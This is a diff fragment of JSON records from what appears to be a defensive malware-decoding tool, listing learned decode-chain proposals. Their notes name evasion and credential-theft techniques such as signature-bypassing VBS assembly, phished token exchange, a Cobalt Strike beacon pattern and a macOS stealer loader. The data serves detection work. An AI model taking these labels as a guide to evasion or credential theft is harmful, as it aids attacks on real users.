+        "created_at": "2026-07-18T09:44:09.065003+00:00",
+        "notes": "VBS char-code assembly to bypass string signatures",
+        "cluster_key": "printable|small|b64|-|lol",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_LOL",
+          "decode_chain": [
+            "base64-decode",
+            "lolbas-annotate"
+          ],
+          "confidence": 90
+        }
+      },
+      {
+        "id": "755ed7ce-22b2-472d-be86-61746336c42b",
+        "created_at": "2026-07-18T09:44:08.975093+00:00",
+        "notes": "Post-phish Cognito token exchange",
+        "cluster_key": "base64|medium|b64|-|-",
+        "proposal": {
+          "archetype_id": "LEARNED_BASE64_MEDIUM_B64_N_N",
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55
+        }
+      },
+      {
+        "id": "c180f111-68da-4a45-ad00-685a33d76448",
+        "created_at": "2026-07-18T09:44:08.881015+00:00",
+        "notes": "GCP service-account credential misuse",
+        "cluster_key": "base64|medium|b64|-|-",
+        "proposal": {
+          "archetype_id": "LEARNED_BASE64_MEDIUM_B64_N_N",
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55
+        }
+      },
+      {
+        "id": "d5b03468-a544-42f9-9314-b3b1f91abdb4",
+        "created_at": "2026-07-18T09:44:08.783658+00:00",
+        "notes": "CS beacon config bxor pattern",
+        "cluster_key": "printable|small|b64|-|-",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_N",
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 85
+        }
+      },
+      {
+        "id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+        "created_at": "2026-07-18T09:44:08.632025+00:00",
+        "notes": "Amos macOS stealer canonical loader",
+        "cluster_key": "printable|small|b64|-|-",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_N",
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55
+        }
+      },
+      {
+        "id": "eaa87c58-094d-4d39-94fe-745a914ade2e",
+        "created_at": "2026-07-17T11:58:14.077193+00:00",
+        "notes": "test-1",
+        "cluster_key": "base64|small|b64|-|lol",
+        "proposal": {
+          "archetype_id": "LEARNED_BASE64_SMALL_B64_N_LOL",
+          "decode_chain": [
+            "base64-decode",
+            "utf16le-decode",
+            "lolbas-annotate"
+          ],
+          "confidence": 95
+        }
+      }
+    ]
+  }
+}
